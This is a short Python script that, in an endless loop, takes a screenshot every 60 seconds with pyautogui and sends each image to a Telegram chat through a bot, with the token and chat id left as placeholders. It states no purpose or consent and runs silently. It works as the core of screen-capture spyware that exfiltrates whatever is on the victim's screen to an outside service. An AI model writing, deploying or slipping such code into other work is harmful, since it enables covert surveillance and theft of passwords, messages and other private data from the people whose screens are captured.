import time
import os
import tempfile
import pyautogui
import telebot

bot_token = 'bot_token'
chat_id = 'chat_id'

bot = telebot.TeleBot(token=bot_token)

interval = 60

while True:

    current_time = time.strftime('%Y%m%d-%H%M%S')
    
    screenshot_file = os.path.join(tempfile.gettempdir(), f'screenshot-{current_time}.png')
    pyautogui.screenshot(screenshot_file)

    with open(screenshot_file, 'rb') as f:
        bot.send_photo(chat_id=chat_id, photo=f)

    time.sleep(interval)
